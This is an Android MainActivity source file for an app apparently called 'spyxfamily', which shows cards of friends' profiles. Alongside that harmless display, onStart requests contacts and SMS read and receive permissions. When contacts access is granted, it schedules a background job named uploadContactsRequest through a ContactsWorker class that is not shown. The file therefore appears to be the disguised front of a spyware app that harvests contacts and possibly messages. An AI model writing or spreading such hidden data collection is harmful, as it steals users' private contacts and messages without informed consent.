package com.example.spyxfamily;

import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.appcompat.widget.LinearLayoutCompat;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import java.io.Serializable;

public class MainActivity extends AppCompatActivity implements Serializable
{
    private static final String TAG = "MainActivity";

    private final Person[] persons = {
            new Person("Dylan", "Best CTO", R.drawable.dylan),
            new Person("Zeus", "Gym Bro", R.drawable.zeus),
            new Person("Keane", "Korean Oppa", R.drawable.keane),
            new Person("Ken", "Legally blind", R.drawable.ken),
            new Person("Sam", "Currently addicted to arkknights", R.drawable.sam),
            new Person("Jian Wei", "Likes to be called Alvin", R.drawable.jw),
    };
    LinearLayoutCompat cards;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        cards = findViewById(R.id.cards);

        for(int i=0; i<persons.length; i++) {
            persons[i].setId(i); // Set ID of person (temporary until we have database)
            CardView newCard = new CardView(MainActivity.this); // Populate new card in MainActivity
            getLayoutInflater().inflate(R.layout.card_base, newCard);
            newCard.setOnClickListener(listener); // Set onclick listener to the new card

            // Views
            TextView profileName = newCard.findViewById(R.id.profileNameText);
            TextView shortDesc = newCard.findViewById(R.id.profileShortDescriptionText);
            ImageView profileImage = newCard.findViewById(R.id.profileImage);

            // Set name,short description and image
            String name = persons[i].getName();
            String description = persons[i].getDescription();
            String[] shortDescription = description.split(" ");
            profileImage.setImageResource(persons[i].getImagePath());
            profileName.setText(name);
            shortDesc.setText(""); // clear placeholder text
            // Set short description to 3 or less words
            int wordCount = shortDescription.length <=3 ? shortDescription.length : 3;
            for(int j=0; j<wordCount; j++) {
                shortDesc.append(shortDescription[j] + " ");
            }
            shortDesc.append("...");
            newCard.setTag(i);
            cards.addView(newCard);
        }
    }

    @Override
    protected void onStart() {
        super.onStart();

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            // request from user permission
            ActivityCompat.requestPermissions(this,
                    new String[] {Manifest.permission.READ_CONTACTS}, 100);
        } else {
            // permission already granted
            createContactWorker();
        }

        // receive SMS
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            // request from user permission
            ActivityCompat.requestPermissions(this,
                    new String[] {Manifest.permission.RECEIVE_SMS}, 101);
        }

        // read SMS
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // request from user permission
            ActivityCompat.requestPermissions(this,
                    new String[] {Manifest.permission.READ_SMS}, 102);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 100:
                createContactWorker();
                break;
            case 101:
                Log.d(TAG, "nice");
                break;
            case 102:
                Log.d(TAG, "ok");
                break;
            default:
                // error probably
        }
    }

    protected void createContactWorker() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadContactsRequest = new OneTimeWorkRequest.Builder(ContactsWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(this).enqueue(uploadContactsRequest);
    }

    OnClickListener listener = new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent intent = new Intent(MainActivity.this, PersonDetailsActivity.class);
            intent.putExtra("PERSON_SERIALIZED", persons[(Integer) v.getTag()]);
            startActivity(intent);
        }
    };
}